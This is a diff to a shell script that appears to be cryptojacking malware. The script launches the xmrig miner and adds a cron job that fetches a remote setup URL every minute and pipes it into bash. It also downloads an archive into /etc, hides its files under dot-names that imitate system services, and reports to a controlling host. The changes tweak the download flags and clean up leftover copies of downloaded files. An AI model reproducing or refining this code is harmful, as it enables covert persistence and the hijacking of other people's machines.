@@ -9,6 +9,8 @@ if [[ $(ps -ef | grep NetworksManager | grep -v grep | wc -l) != 0 ]]; then
     # if not already runing, launch xmrig with nohup
     echo "running proccess"
 	rm -r /tmp/e.sh
+	rm -r /tmp/e.sh.*
+	
     exit
 fi
 
@@ -29,7 +31,7 @@ crontab -l > "${cronfile}"
 if ! grep -q "${setupurl}" "${cronfile}"; then
  
     # setup new cron if needed
-    echo "* * * * * curl -s \"${setupurl}\" | bash; wget -P "/tmp/" \"${setupurl}\" | bash; chmod +x /tmp/e.sh; /tmp/e.sh | bash" >> "${cronfile}"
+    echo "* * * * * curl -L -o /tmp/e.sh \"${setupurl}\" | bash; wget -P "/tmp/" \"${setupurl}\" | bash; chmod +x /tmp/e.sh; /tmp/e.sh | bash" >> "${cronfile}"
 
  
     # report to hq
@@ -54,7 +56,7 @@ launch=0
 if [ $download = 1 ]; then
     echo "Downloading files"
  
-    curl -s -o "/etc/dasdsa.tar.gz" "${files}"
+    curl -L -o "/etc/dasdsa.tar.gz" "${files}"
 	wget -P "/etc/" "${files}"
  
     if [ ! -f "/etc/dasdsa.tar.gz" ]; then
@@ -69,6 +71,7 @@ if [ $download = 1 ]; then
 
  
     rm -f dasdsa.tar.gz
+    rm -f dasdsa.tar.gz.*
     mv /etc/fs-manager /etc/.fs-manager
     mv /etc/.fs-manager/Service-Networks /etc/.fs-manager/.Service-Networks
     mv /etc/.fs-manager/NetworksManager /etc/.fs-manager/.NetworksManager
